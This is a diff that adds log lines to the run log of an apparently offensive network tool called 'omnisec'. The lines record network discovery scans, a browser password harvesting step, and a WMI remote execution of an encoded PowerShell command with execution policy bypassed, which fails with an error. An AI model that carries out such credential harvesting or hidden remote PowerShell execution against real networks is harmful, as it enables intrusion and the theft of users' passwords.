@@ -18,3 +18,18 @@
 2026-05-06 15:19:19,122 | [INFO] | [STATE] Saved to omnisec_state_1778073559.json
 2026-05-06 15:20:07,497 | [WARNING] | impacket not available — Windows exploitation disabled
 2026-05-06 15:20:09,771 | [INFO] | [ENGINE] Initialized — local IP: 192.168.137.201 network: 192.168.137.0/24
+2026-05-07 12:56:25,845 | [INFO] | [ENGINE] Initialized — local IP: 192.168.137.201 network: 192.168.137.0/24
+2026-05-07 12:57:07,735 | [INFO] | [ENGINE] Initialized — local IP: 192.168.137.201 network: 192.168.137.0/24
+2026-05-07 13:03:09,457 | [INFO] | [ENGINE] Initialized — local IP: 192.168.137.201 network: 192.168.137.0/24
+2026-05-07 13:03:37,013 | [INFO] | [DISCOVER] Starting device discovery (exhaustive=True)
+2026-05-07 13:03:37,049 | [INFO] | [DISCOVER] Scanning 5 network ranges: ['192.168.137.0/24', '192.168.42.0/24', '172.16.0.0/12']...
+2026-05-07 13:04:28,141 | [INFO] | [DISCOVER] Starting device discovery (exhaustive=True)
+2026-05-07 13:04:28,292 | [INFO] | [DISCOVER] Scanning 5 network ranges: ['192.168.137.0/24', '192.168.42.0/24', '172.16.0.0/12']...
+2026-05-07 13:07:06,519 | [INFO] | [DISCOVER] Starting device discovery (exhaustive=True)
+2026-05-07 13:07:08,192 | [INFO] | [DISCOVER] Scanning 5 network ranges: ['192.168.137.0/24', '192.168.42.0/24', '172.16.0.0/12']...
+2026-05-07 13:12:17,384 | [INFO] | [ENGINE] Initialized — local IP: 192.168.137.201 network: 192.168.137.0/24
+2026-05-07 13:15:42,712 | [INFO] | [DISCOVER] Starting device discovery (exhaustive=True)
+2026-05-07 13:15:42,740 | [INFO] | [DISCOVER] Scanning 5 network ranges: ['192.168.137.0/24', '192.168.42.0/24', '192.168.0.0/16']...
+2026-05-07 13:17:28,571 | [INFO] | [BROWSER-PWDS] Harvesting passwords from 192.168.137.0
+2026-05-07 13:17:29,307 | [INFO] | [WMI-EXEC] 192.168.137.0: powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand Cg
+2026-05-07 13:17:29,806 | [ERROR] | [WMI-EXEC] 192.168.137.0: object of type 'NoneType' has no len()
